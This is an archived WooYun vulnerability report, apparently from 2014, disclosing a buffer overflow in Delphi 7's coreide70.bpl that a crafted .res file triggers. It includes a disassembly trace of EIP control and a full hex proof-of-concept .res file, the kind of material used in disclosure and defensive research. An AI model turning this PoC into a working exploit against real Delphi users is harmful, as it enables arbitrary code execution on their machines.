@@ -1,0 +1,221 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		DELPHI7缓冲区溢出漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		DELPHI7缓冲区溢出漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/光刃">光刃</a> 
+</li><li>提交时间：		2014-01-01 14:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-09：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-26：	细节向普通白帽子公开<br/>
+									2014-02-15：	细节向实习白帽子公开<br/>
+									2014-04-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">DELPHI7缓冲区溢出漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在处理.res文件时候，未检测相应结构大小，造成缓冲区溢出。<br />
+<br />
+攻击者可以构造特定的.res文件，即可利用此漏洞执行任意想执行的程序。<br />
+<br />
+漏洞文件coreide70.bpl<br />
+<br />
+文件版本7.0.4.453<br />
+<br />
+<br />
+<br />
+相关函数<br />
+<br />
+0049495C    8B45 08         mov     eax, dword ptr [ebp+8]           ; 这里eax被淹没   [eax] 可控<br />
+<br />
+0049495F    8B40 FC         mov     eax, dword ptr [eax-4]           ; [eax-4]可控 eax 可控<br />
+<br />
+								     ; 此时eax就是我们poc里面的41414141  设这个地址为ADD<br />
+<br />
+00494962    B9 01000000     mov     ecx, 1<br />
+<br />
+00494967    8B18            mov     ebx, dword ptr [eax]             ; ebx=[ADD]  ebx可控<br />
+<br />
+00494969    FF53 0C         call    dword ptr [ebx+C]                ; ebx可控 [[ADD]+c] 可控(eip可控)  可指向shellcode<br />
+<br />
+<br />
+<br />
+0013F821  31 31 31 31 31 31 31 31 31 31 31 31 41 41 41 41  111111111111AAAA<br />
+<br />
+0013F831  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0013F841  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0013F851  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+0013F861  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  1111111111111111<br />
+<br />
+</p><p class="detail"><a href="../images/31173400b4bf0ad12da01eb2eec8401b1f5f6d0b.png" target="_blank"><img src="../images/31173400b4bf0ad12da01eb2eec8401b1f5f6d0b.png" alt="delphi.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">把这2个文件放在同一个文件夹下面。用delphi打开poc.dpr 既可以触发漏洞。<br />
+<br />
+poc.dpr<br />
+<br />
+	(把下面数据以文本形式保存，重命名为poc.dpr）<br />
+<br />
+</p><pre><code>{$R *.res}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+poc.dpr<br />
+<br />
+	（把下面数据以16进制的形式保存，重命名为poc.res）<br />
+<br />
+</p><pre><code>0000000020000000FFFF0000FFFF000000000000000000000000000000000000E802000020000000FFFF0300FFFF010000000000101004080000000000000000280000002000000040000000010004000000000000020000000000000000000000000000000000000000000000008000008000000080800080000000800080008080000080808000C0C0C0000000FF0000FF000000FFFF00FF000000FF00FF00FFFF0000FFFFFF000B3111111111111000000000000000000BBB333333333110000000000000000008888B333333331000000000000000000033333333331100000000000000000000888888BBBBB10000000000000000000000333333333100044444000000000000008BBBB3B10004467676440000000000008BBBB331004767676676400000000000888BB3310226767667676400000000000BBBB3310277776762767400000000000BBBB3317777777222676640000000000888BB3177777772227676400000000000BBBB3318777222226766400000000000BBBB3318777222222666400000000000888BB31877772277222240000000000008BBB3318F777227222240000000000008BBB33187F7772222240000000000000888BB3172777222FB0400000000000000BBBB33172777222FB000000000000000888B331722777724BB00000000000000088BB310022222000BB0000000000000088BB3310000000000BB0000000000000088BB31000000000BBBB000000000000088BB331000000BBBBBBB7000000000000BBB333100000BBBBB0000B3333333333BBB3331000000BBBB0000BB3333333333BBB333000000BBBBB000BBB3333333BBBBBB330000000BBBBB008BBBBBBBBBBB88BBB300000000BBBBB88B8888888888888BB300000000BBBBB08888888888888888BB000000000BBB000000000000000000000000000000B0008001FFFF8001FFFF8001FFFFC003FFFFC003FFFFF00383FFF00E00FFF00C007FF008003FF808003FF800001FF800001FFC00001FFC00001FFC00001FFE00001FFE00003FFE00003FFF00003FFF00001FFF81838FFF80FFC7FFC0FC03FFC07E01FFE03E0F00003F0700003F0300003F8100003FC000003FC100003FE3FFFFFFF714000000C0010000FFFF0E004D00410049004E00490043004F004E0031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310041004100410041003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100310031003100000000000000001010040800000000000000000000010001002020100001000400E8020000010000</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+注意偏移4BDH的0041004100410041（UNICODE编码 就是41414141，AAAA) <br />
+<br />
+41414141H是我们随意写的，但是这个地址很重要。攻击者精心设计这个地址和周边的数据，既可以执行想要的shellcode </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">检测大小 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/光刃" title="光刃">光刃</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047549" title="DELPHI7缓冲区溢出漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：11 </p>
+													<p class="detail">确认时间：2014-01-06 08:49</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="47549";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
